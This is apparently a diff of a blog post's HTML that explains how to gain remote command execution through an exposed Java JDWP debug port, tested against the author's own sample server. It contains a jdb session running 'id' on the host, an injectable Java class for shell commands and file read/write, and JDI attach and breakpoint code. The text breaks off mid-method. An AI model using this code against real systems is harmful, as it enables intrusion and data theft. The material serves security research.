+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> port <span style=color:#f92672>=</span> 8000;
+</span></span><span style=display:flex><span>        HttpServer server <span style=color:#f92672>=</span> HttpServer.<span style=color:#a6e22e>create</span>(<span style=color:#66d9ef>new</span> InetSocketAddress(port), 0);
+</span></span><span style=display:flex><span>        server.<span style=color:#a6e22e>createContext</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>new</span> MyHandler());
+</span></span><span style=display:flex><span>        server.<span style=color:#a6e22e>setExecutor</span>(<span style=color:#66d9ef>null</span>); <span style=color:#75715e>// creates a default executor</span>
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Serving on port 8000..\n&#34;</span>);
+</span></span><span style=display:flex><span>        server.<span style=color:#a6e22e>start</span>();
+</span></span><span style=display:flex><span>    } 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MyHandler</span> <span style=color:#66d9ef>implements</span> HttpHandler {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>handle</span>(HttpExchange t) <span style=color:#66d9ef>throws</span> IOException {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Logging IP address of request to stdout</span>
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Request received from: &#34;</span> <span style=color:#f92672>+</span> t.<span style=color:#a6e22e>getRemoteAddress</span>().<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Displaying Hello message</span>
+</span></span><span style=display:flex><span>            String hello <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello CBSA!!!!!!&#34;</span>;
+</span></span><span style=display:flex><span>            String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;&#34;</span> <span style=color:#f92672>+</span> hello <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;/h1&gt;\n&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Displaying the OS arch that this is running on</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;&lt;h2&gt;JVM Architecture: &#34;</span> <span style=color:#f92672>+</span> System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;os.arch&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;/h2&gt;\n&#34;</span>;
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;&lt;h2&gt;JVM Flavor: &#34;</span> <span style=color:#f92672>+</span> System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;java.vm.name&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span>  <span style=color:#f92672>+</span> System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;java.version&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;/h2&gt;\n&#34;</span>;
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Sending response</span>
+</span></span><span style=display:flex><span>            t.<span style=color:#a6e22e>sendResponseHeaders</span>(200, response.<span style=color:#a6e22e>length</span>());
+</span></span><span style=display:flex><span>            OutputStream os <span style=color:#f92672>=</span> t.<span style=color:#a6e22e>getResponseBody</span>();
+</span></span><span style=display:flex><span>            os.<span style=color:#a6e22e>write</span>(response.<span style=color:#a6e22e>getBytes</span>());
+</span></span><span style=display:flex><span>            os.<span style=color:#a6e22e>close</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>After compiling the application, I executed the JAR with debug options enabled:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mike@host:~/jdwp_stuff/hello-world-http-java$ java -agentlib:jdwp<span style=color:#f92672>=</span>transport<span style=color:#f92672>=</span>dt_socket,server<span style=color:#f92672>=</span>y,suspend<span style=color:#f92672>=</span>n,address<span style=color:#f92672>=</span><span style=color:#ae81ff>1234</span> -jar ./src/HelloWorld.jar 
+</span></span><span style=display:flex><span>Listening <span style=color:#66d9ef>for</span> transport dt_socket at address: <span style=color:#ae81ff>1234</span>
+</span></span><span style=display:flex><span>Serving on port 8000..
+</span></span></code></pre></div><p>Once run, I used the Java Debugger <code>jdb</code> to attach to the remote VM and list the loaded classes to look for a breakpoint:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mike@host:~$ jdb -attach 127.0.0.1:1234
+</span></span><span style=display:flex><span>Set uncaught java.lang.Throwable
+</span></span><span style=display:flex><span>Set deferred uncaught java.lang.Throwable
+</span></span><span style=display:flex><span>Initializing jdb ...
+</span></span><span style=display:flex><span>&gt; classes
+</span></span><span style=display:flex><span>** classes list **
+</span></span><span style=display:flex><span>HelloWorld
+</span></span><span style=display:flex><span>HelloWorld$MyHandler
+</span></span><span style=display:flex><span>boolean<span style=color:#f92672>[]</span>
+</span></span><span style=display:flex><span>byte<span style=color:#f92672>[]</span>
+</span></span><span style=display:flex><span>char<span style=color:#f92672>[]</span>
+</span></span><span style=display:flex><span>com.sun.net.httpserver.Filter
+</span></span><span style=display:flex><span>com.sun.net.httpserver.HttpContext
+</span></span><span style=display:flex><span>com.sun.net.httpserver.HttpHandler
+</span></span><span style=display:flex><span>com.sun.net.httpserver.HttpServer
+</span></span><span style=display:flex><span>com.sun.net.httpserver.spi.HttpServerProvider
+</span></span><span style=display:flex><span>com.sun.net.httpserver.spi.HttpServerProvider$1
+</span></span><span style=display:flex><span>... snip ...
+</span></span><span style=display:flex><span>&gt; methods HelloWorld$MyHandler
+</span></span><span style=display:flex><span>** methods list **
+</span></span><span style=display:flex><span>HelloWorld$MyHandler &lt;init&gt;<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>HelloWorld$MyHandler handle<span style=color:#f92672>(</span>com.sun.net.httpserver.HttpExchange<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>java.lang.Object registerNatives<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object &lt;init&gt;<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object getClass<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object hashCode<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object equals<span style=color:#f92672>(</span>java.lang.Object<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>java.lang.Object clone<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object toString<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object notify<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object notifyAll<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object wait<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object wait<span style=color:#f92672>(</span>long<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>java.lang.Object wait<span style=color:#f92672>(</span>long, int<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>java.lang.Object finalize<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>java.lang.Object &lt;clinit&gt;<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>com.sun.net.httpserver.HttpHandler handle<span style=color:#f92672>(</span>com.sun.net.httpserver.HttpExchange<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>I placed a breakpoint on the <code>handle</code> method and used cURL to trigger the HTTP handler. Once the breakpoint was hit, I issued the following command to use Java&rsquo;s <code>java.lang.Runtime</code> <code>exec()</code> method to execute a local command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; stop in HelloWorld$MyHandler.handle
+</span></span><span style=display:flex><span>Set breakpoint HelloWorld$MyHandler.handle
+</span></span><span style=display:flex><span>&gt; 
+</span></span><span style=display:flex><span>Breakpoint hit: <span style=color:#e6db74>&#34;thread=HTTP-Dispatcher&#34;</span>, HelloWorld$MyHandler.handle<span style=color:#f92672>()</span>, line<span style=color:#f92672>=</span><span style=color:#ae81ff>23</span> bci<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HTTP-Dispatcher<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> print new java.lang.String<span style=color:#f92672>(</span>java.lang.Runtime.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;id&#34;</span><span style=color:#f92672>)</span>.getInputStream<span style=color:#f92672>()</span>.readAllBytes<span style=color:#f92672>())</span>
+</span></span><span style=display:flex><span> new java.lang.String<span style=color:#f92672>(</span>java.lang.Runtime.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;id&#34;</span><span style=color:#f92672>)</span>.getInputStream<span style=color:#f92672>()</span>.readAllBytes<span style=color:#f92672>())</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;uid=1000(mike) gid=1000(mike) groups=1000(mike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
+</span></span></span></code></pre></div><p>Now I have:</p><ol><li>A breakpoint I can reliably trigger with a curl request</li><li>A <code>jdb</code> command I can use to execute commands on the host</li></ol><p>So I need to write code that will:</p><ol><li>Connect to the remote VM</li><li>Break on the target method</li><li>Wait for the breakpoint to be hit</li><li>Execute code in the suspended thread</li><li>Return the result</li></ol><h2 id=solution>Solution</h2><p>It&rsquo;s important to note that all local data must be mirrored to the remote VM, and all remote data you want to retrieve should be mirrored into the local process when using JDI to invoke remote methods.</p><p>My first and admittedly naive approach was to:</p><ol><li>Leverage JDI to connect to the remote VM</li><li>Suspend all target threads (important mistake)</li><li>Invoke <code>java.lang.Runtime.getRuntime().exec(String command)</code> with my target command</li><li>Call the <code>Process.getInputStream().readAllBytes()</code> method</li><li>Call the <code>String(byte[])</code> constructor</li><li>Copy the resulting string from the target VM to my host and print the result</li></ol><p>This ended up being&mldr; way too many JDI calls which inevitably took forever (if they ever completed).</p><p>I will spare you the details of my trial and error, but I found several key issues with this approach:</p><ul><li>Repeated calls over JDWP were unstable and took several seconds for each command</li><li>Suspending all threads was a poor decision based on my lack of subject knowledge (read: skill issue), as this caused deadlock and ultimately disrupted the running application&rsquo;s availability</li></ul><p>I kept beating my head against this problem until I realized, why go through the hassle of writing 319287391287 manual invocations and string/byte copies to and from the remote VM when I could just load a class that performs the tasks I need and greatly reduce the remote invocations?</p><p>I will use the following simple example class which supports command execution, file upload, and file download. Further works can absolutely expand on this &ndash; there&rsquo;s so much more possible.</p><p>Do note that all of the methods are static, as I do not necessarily need to retain any stateful information and did not create an instance of the class in the remote VM.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Java data-lang=Java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Vastatrix4</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>ExecuteCommand</span>(String command) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>{
+</span></span><span style=display:flex><span>            Process process <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ProcessBuilder(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, command)
+</span></span><span style=display:flex><span>                    .<span style=color:#a6e22e>redirectErrorStream</span>(<span style=color:#66d9ef>true</span>)
+</span></span><span style=display:flex><span>                    .<span style=color:#a6e22e>start</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            InputStream stdout <span style=color:#f92672>=</span> process.<span style=color:#a6e22e>getInputStream</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> String(stdout.<span style=color:#a6e22e>readAllBytes</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (Exception ex){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ex.<span style=color:#a6e22e>toString</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>ReadFile</span>(String filename){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>{
+</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(filename);
+</span></span><span style=display:flex><span>            FileInputStream fis <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileInputStream(file);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> data <span style=color:#f92672>=</span> fis.<span style=color:#a6e22e>readAllBytes</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> data;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (Exception ex){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ex.<span style=color:#a6e22e>toString</span>().<span style=color:#a6e22e>getBytes</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>WriteFile</span>(String filename, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> data){
+</span></span><span style=display:flex><span>        File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(filename);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (FileOutputStream fos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(file)) {
+</span></span><span style=display:flex><span>            fos.<span style=color:#a6e22e>write</span>(data);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> filename;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (Exception ex){
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ex.<span style=color:#a6e22e>toString</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Compiling the class with <code>javac Vastatrix4.java</code> we are left with the compiled class file which we can then directly inject into the remote VM.</p><p>Firstly we connect to the remote VM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>Connect</span>(){
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>AttachingConnector<span style=color:#f92672>&gt;</span> connectors <span style=color:#f92672>=</span> Bootstrap.<span style=color:#a6e22e>virtualMachineManager</span>().<span style=color:#a6e22e>attachingConnectors</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (AttachingConnector connector : connectors) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (connector.<span style=color:#a6e22e>name</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;com.sun.jdi.SocketAttach&#34;</span>)) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>attachingConnector</span> <span style=color:#f92672>=</span> connector;
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (attachingConnector <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] No attaching connector found&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Connector.<span style=color:#a6e22e>Argument</span><span style=color:#f92672>&gt;</span> arguments;
+</span></span><span style=display:flex><span>        arguments <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>attachingConnector</span>.<span style=color:#a6e22e>defaultArguments</span>();
+</span></span><span style=display:flex><span>        arguments.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;hostname&#34;</span>).<span style=color:#a6e22e>setValue</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>host</span>);
+</span></span><span style=display:flex><span>        arguments.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;port&#34;</span>).<span style=color:#a6e22e>setValue</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>port</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>attachingConnector</span>.<span style=color:#a6e22e>attach</span>(arguments);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException <span style=color:#f92672>|</span> IllegalConnectorArgumentsException e) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Error attaching connector\n\t&#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[+] Successfully connected to remote JDI&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>Once complete we can hunt for and break on a commonly used method. Some of the methods I&rsquo;ve used with great success are:</p><pre tabindex=0><code>java.lang.Thread.run 
 java.lang.System.getProperty
 sun.net.httpserver.FixedLengthOutputStream.close
-</code></pre><p>The following code shows breaking on a remote method, given it&rsquo;s Class, method name, and method signature (which is defined <a href="https://docs.oracle.com/javase/8/docs/jdk/api/jpda/jdi/com/sun/jdi/doc-files/signature.html">here</a>)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">BreakOnMethod</span>(String className, String methodName, String signature) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] VM not initialized, cannot break on method!&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>ReferenceType<span style="color:#f92672">&gt;</span> classes <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">classesByName</span>(className);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (classes.<span style="color:#a6e22e">isEmpty</span>()) {
-</span></span><span style="display:flex;"><span>            ClassPrepareRequest prepareRequest <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">eventRequestManager</span>().<span style="color:#a6e22e">createClassPrepareRequest</span>();
-</span></span><span style="display:flex;"><span>            prepareRequest.<span style="color:#a6e22e">setSuspendPolicy</span>(EventRequest.<span style="color:#a6e22e">SUSPEND_EVENT_THREAD</span>);
-</span></span><span style="display:flex;"><span>            prepareRequest.<span style="color:#a6e22e">addClassFilter</span>(className);
-</span></span><span style="display:flex;"><span>            prepareRequest.<span style="color:#a6e22e">enable</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            EventSet eventSet;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
-</span></span><span style="display:flex;"><span>                eventSet <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">eventQueue</span>().<span style="color:#a6e22e">remove</span>();
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (Event event : eventSet) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (event <span style="color:#66d9ef">instanceof</span> ClassPrepareEvent) {
-</span></span><span style="display:flex;"><span>                        ClassPrepareEvent cp <span style="color:#f92672">=</span> (ClassPrepareEvent) event;
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (cp.<span style="color:#a6e22e">referenceType</span>().<span style="color:#a6e22e">name</span>().<span style="color:#a6e22e">equals</span>(className)) {
-</span></span><span style="display:flex;"><span>                            classes <span style="color:#f92672">=</span> List.<span style="color:#a6e22e">of</span>(cp.<span style="color:#a6e22e">referenceType</span>());
-</span></span><span style="display:flex;"><span>                            eventSet.<span style="color:#a6e22e">resume</span>();
-</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>                        }
-</span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>classes.<span style="color:#a6e22e">isEmpty</span>()) <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            prepareRequest.<span style="color:#a6e22e">disable</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        ReferenceType refType <span style="color:#f92672">=</span> classes.<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>Method<span style="color:#f92672">&gt;</span> methods <span style="color:#f92672">=</span> (signature <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>                <span style="color:#f92672">?</span> refType.<span style="color:#a6e22e">methodsByName</span>(methodName, signature)
-</span></span><span style="display:flex;"><span>                : refType.<span style="color:#a6e22e">methodsByName</span>(methodName);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (methods.<span style="color:#a6e22e">isEmpty</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Method not found: &#34;</span> <span style="color:#f92672">+</span> methodName);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Method method <span style="color:#f92672">=</span> methods.<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>Location<span style="color:#f92672">&gt;</span> locs <span style="color:#f92672">=</span> method.<span style="color:#a6e22e">allLineLocations</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (locs.<span style="color:#a6e22e">isEmpty</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalStateException(<span style="color:#e6db74">&#34;No executable locations in method: &#34;</span> <span style="color:#f92672">+</span> method.<span style="color:#a6e22e">name</span>());
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        Location loc <span style="color:#f92672">=</span> locs.<span style="color:#a6e22e">get</span>(0);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        BreakpointRequest bp <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">eventRequestManager</span>().<span style="color:#a6e22e">createBreakpointRequest</span>(loc);
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// warning!</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Don&#39;t be dumb like me and suspend all threads!</span>
-</span></span><span style="display:flex;"><span>        bp.<span style="color:#a6e22e">setSuspendPolicy</span>(EventRequest.<span style="color:#a6e22e">SUSPEND_EVENT_THREAD</span>);
-</span></span><span style="display:flex;"><span>        bp.<span style="color:#a6e22e">enable</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Breakpoint set at %s.%s%s%n&#34;</span>, className, methodName,
-</span></span><span style="display:flex;"><span>                (signature <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> signature : <span style="color:#e6db74">&#34;&#34;</span>));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
-</span></span><span style="display:flex;"><span>            EventSet eventSet <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">eventQueue</span>().<span style="color:#a6e22e">remove</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (Event event : eventSet) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (event <span style="color:#66d9ef">instanceof</span> BreakpointEvent) {
-</span></span><span style="display:flex;"><span>                    BreakpointEvent be <span style="color:#f92672">=</span> (BreakpointEvent) event;
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">SuspendedThread</span> <span style="color:#f92672">=</span> be.<span style="color:#a6e22e">thread</span>();
-</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// for whatever reason the thread wasn&#39;t always suspended</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// I should probably check the suspend count here before re-suspending</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// *hand waving* this is a PoC</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">SuspendedThread</span>.<span style="color:#a6e22e">suspend</span>();
-</span></span><span style="display:flex;"><span>                    
